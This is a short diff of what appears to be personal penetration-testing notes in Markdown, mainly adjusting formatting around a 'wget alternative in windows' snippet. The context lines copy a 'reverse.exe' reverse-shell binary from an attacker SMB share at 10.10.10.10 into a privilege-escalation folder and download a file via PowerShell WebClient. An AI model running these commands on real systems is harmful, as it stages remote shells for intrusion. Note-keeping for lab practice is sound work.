@@ -19,10 +19,17 @@ hello world
 
 
 ####  wget alternative in windows
-```shell.cmd
+```shell.com
+---
 	copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
 
 	$client = new-object System.Net.WebClient
 	$client.DownloadFile("http://www.xyz.net/file.txt","C:\tmp\file.txt")
-
+---
+```
+# hell
+```yaml
+---
+math: true
+---
 ```
